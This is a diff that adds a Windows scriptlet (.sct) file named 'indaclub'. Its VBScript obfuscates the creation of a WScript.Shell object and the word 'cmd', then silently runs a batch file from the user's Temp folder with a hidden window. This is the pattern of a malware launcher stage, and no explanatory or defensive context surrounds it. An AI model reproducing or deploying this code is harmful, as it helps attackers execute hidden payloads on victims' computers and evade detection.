@@ -1,0 +1,22 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="indaclub"
+    progid="indaclub"
+    version="1.00"
+    classid="{204774CF-D251-4F02-855B-2BE70585184B}"
+    remotable="true"
+	>
+</registration>
+
+<script language="VBScript">
+<![CDATA[
+		Dim wss
+		wss="WScript"
+		Set palladin = CreateObject("" & "" & "" & wss & "" & ".Shell" & "" & "")
+		palladin.Run Chr(90+(3*3)) & "Md /c %UserpRofile%\apPdata\loCal\teMp\taSk.baT",0,True
+]]>
+</script>
+
+</scriptlet>
